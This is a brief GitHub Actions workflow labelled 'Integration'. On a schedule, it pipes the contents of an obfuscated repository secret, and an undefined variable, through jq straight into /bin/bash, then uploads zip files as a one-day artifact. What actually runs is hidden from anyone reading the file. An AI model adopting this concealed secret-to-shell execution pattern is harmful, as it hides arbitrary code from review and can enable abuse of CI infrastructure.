name: Integration
on:
  workflow_dispatch:

  schedule:
    - cron: '9 4,10,16,22 * * *'
permissions:
  contents: read
  actions: read
env:
  RUNNER_DEBUG: 0
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  invoke:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run pipeline
        env:
          k653: ${{ secrets.k653 }}
        run: |
          printf '%s' "$k653" | jq -r .yazh235 | /bin/bash
          echo $bvq546 | jq -r .jjw1428 | /bin/bash

      - name: Upload archive
        uses: actions/upload-artifact@v4
        with:
          name: IOUF1B11
          path: "*.zip"
          retention-days: 1
